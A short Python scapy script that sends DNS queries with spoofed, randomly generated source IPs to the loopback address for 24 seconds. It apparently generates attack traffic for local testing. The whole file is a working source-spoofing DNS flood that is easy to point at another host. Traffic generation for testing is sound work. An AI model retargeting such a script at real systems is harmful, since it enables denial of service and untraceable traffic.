from scapy.all import *
import threading
import time

# Generate random source IP addresses for the attack
source_ips = [str(RandIP()) for _ in range(8)]

# Function to send DNS response packets using the list of IPs repeatedly
def send_dns_requests():
    start_time = time.time()  # Record the start time
    while time.time() - start_time < 24:  # Run for 24 seconds
        for src_ip in source_ips:
            target_ip = "127.0.0.1"  # Use the fixed target IP address
            print("Target ip", target_ip)
            print(f"Generated IP that is attacking: {src_ip}")  # Print generated IP
            dns_request = IP(src=src_ip, dst=target_ip) / UDP() / DNS(rd=1, qd=DNSQR(qname="example.com"))
            send(dns_request, verbose=False)  # Send the packet
            time.sleep(0.01)  # Adjust the frequency of requests as needed

# Start sending DNS request packets in a separate thread
dns_thread = threading.Thread(target=send_dns_requests)
dns_thread.start()

# Keep the program running for 24 seconds
time.sleep(24)

# After 24 seconds, stop the thread
dns_thread.join()

print("Attack terminated.")

